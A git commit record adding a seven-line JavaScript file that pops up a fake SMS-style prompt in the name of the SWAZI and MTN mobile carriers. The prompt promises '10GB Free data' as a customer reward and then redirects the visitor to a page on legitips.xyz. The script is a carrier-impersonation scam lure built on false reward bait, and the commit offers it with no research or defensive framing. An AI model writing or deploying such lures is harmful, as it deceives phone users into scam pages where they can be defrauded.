c297e087f10ff599d27b95b81355bdb0c21ae82f
legitips <83867893+legitips@users.noreply.github.com>
2024-06-25 16:46:32 -0700

    Create freedata-swazimtn-activation.js

---
+++ freedata-swazimtn-activation.js
@@ -0,0 +1,7 @@
+var password = '1'
+password=prompt('SWAZI & MTN SMS: Dear customer, kindly check if your SWAZI & MTN sim card is qualify to receive from 10GB Free data, all customers Reward, press 1 to check now ','1');
+if (password != '1') {
+location.href='https://legitips.xyz/freedata-swazimtn.html';
+}
+
+
